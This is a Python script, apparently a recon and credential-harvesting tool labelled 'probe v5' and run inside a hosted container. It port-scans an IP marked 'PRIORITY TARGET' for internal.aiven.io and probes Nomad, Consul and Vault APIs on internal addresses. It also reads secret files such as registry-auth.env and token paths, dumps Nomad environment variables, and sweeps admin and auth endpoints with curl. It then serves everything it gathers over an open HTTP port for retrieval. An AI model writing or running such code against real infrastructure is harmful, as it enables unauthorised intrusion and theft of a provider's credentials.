import http.server
import urllib.request
import json
import os
import socket
import ssl
import subprocess

results = {}

def probe(name, url, timeout=5, headers=None):
    try:
        req = urllib.request.Request(url)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        data = resp.read().decode('utf-8', errors='replace')
        results[name] = {"status": resp.status, "data": data[:4000], "headers": dict(resp.headers)}
    except Exception as e:
        results[name] = {"error": str(e)}

def port_scan(name, host, ports, timeout=2):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            if result == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    results[name] = {"open_ports": open_ports}

def run_cmd(name, cmd, timeout=5):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:4000], "stderr": r.stderr[:500]}
    except Exception as e:
        results[name] = {"error": str(e)}

# 1. internal.aiven.io (35.244.221.102) - PRIORITY TARGET
port_scan("internal_aiven_ports", "35.244.221.102",
    [80, 443, 4646, 4647, 4648, 8080, 8443, 8500, 8200, 9090, 3000, 5000, 6443])

# Try HTTP/HTTPS on internal.aiven.io
for port in [80, 443, 8080, 8443]:
    scheme = "https" if port in [443, 8443] else "http"
    probe(f"internal_aiven_{port}", f"{scheme}://internal.aiven.io:{port}/")
    probe(f"internal_aiven_{port}_v1", f"{scheme}://internal.aiven.io:{port}/v1/")
    if port in [80, 8080]:
        probe(f"internal_aiven_{port}_health", f"{scheme}://internal.aiven.io:{port}/health")

# Direct IP access
probe("internal_ip_80", "http://35.244.221.102:80/")
probe("internal_ip_443", "https://35.244.221.102:443/")

# 2. Nomad endpoints (if accessible)
for host in ["127.0.0.1", "169.254.1.2", "35.244.221.102", "10.132.0.1"]:
    for port in [4646]:
        probe(f"nomad_{host.replace('.','_')}_{port}", f"http://{host}:{port}/v1/agent/self")
        probe(f"nomad_{host.replace('.','_')}_{port}_jobs", f"http://{host}:{port}/v1/jobs")
        probe(f"nomad_{host.replace('.','_')}_{port}_allocs", f"http://{host}:{port}/v1/allocations")

# 3. Consul endpoints (often paired with Nomad)
for host in ["127.0.0.1", "169.254.1.2", "35.244.221.102"]:
    probe(f"consul_{host.replace('.','_')}_8500", f"http://{host}:8500/v1/agent/self")

# 4. Vault endpoints
for host in ["127.0.0.1", "169.254.1.2", "35.244.221.102"]:
    probe(f"vault_{host.replace('.','_')}_8200", f"http://{host}:8200/v1/sys/health")

# 5. Nomad allocation metadata - check env for Nomad vars
results["nomad_env"] = {k:v for k,v in os.environ.items() if 'NOMAD' in k.upper()}

# 6. Check Nomad token file
for path in ['/secrets/nomad_token', '/secrets/.nomad_token', '/alloc/data', 
             '/local', '/secrets', '/alloc']:
    run_cmd(f"ls_{path.replace('/','_')}", f"ls -la {path} 2>/dev/null")

# 7. Registry auth - if private repos are used, this contains docker creds
run_cmd("registry_auth", "cat /secrets/registry-auth.env 2>&1")

# 8. .nomad-mount content
run_cmd("nomad_mount", "cat /secrets/.nomad-mount 2>&1; stat /secrets/.nomad-mount 2>&1")

# 9. Check if there are ANY other env files or secrets
run_cmd("all_secrets_deep", "find /secrets /run/secrets /var/run/secrets /alloc /local -type f 2>/dev/null | head -30")

# 10. Hosts file for internal references
run_cmd("hosts", "cat /etc/hosts")

# 11. Try reaching the infrastructure nodes from /etc/hosts on their Nomad port
ipv6_nodes = [
    "fda7:a938:5bfe:5fa6:0:5ee:a62c:22a",  # 330
    "fda7:a938:5bfe:5fa6:0:5ee:aa07:73b2",  # 336
]
for ip in ipv6_nodes:
    for port in [4646, 4647, 8500, 8200]:
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex((ip, port))
            if result == 0:
                results[f"infra6_{port}"] = "OPEN"
            s.close()
        except Exception as e:
            pass

# 12. curl internal.aiven.io with various paths
run_cmd("curl_internal", """
for path in / /v1/ /api/ /health /healthz /version /status /login /oauth /auth /metrics /admin /console; do
    code=$(curl -s -o /dev/null -w '%{http_code}' -m 3 "http://internal.aiven.io$path" 2>/dev/null)
    if [ "$code" != "000" ]; then
        body=$(curl -s -m 3 "http://internal.aiven.io$path" 2>/dev/null | head -c 100)
        echo "$path: $code $body"
    fi
done
""")

# 13. curl internal.aiven.io HTTPS
run_cmd("curl_internal_https", """
for path in / /v1/ /api/ /health /version; do
    code=$(curl -sk -o /dev/null -w '%{http_code}' -m 3 "https://internal.aiven.io$path" 2>/dev/null)
    if [ "$code" != "000" ]; then
        body=$(curl -sk -m 3 "https://internal.aiven.io$path" 2>/dev/null | head -c 200)
        echo "$path: $code $body"
    fi
done
""")

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v5 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
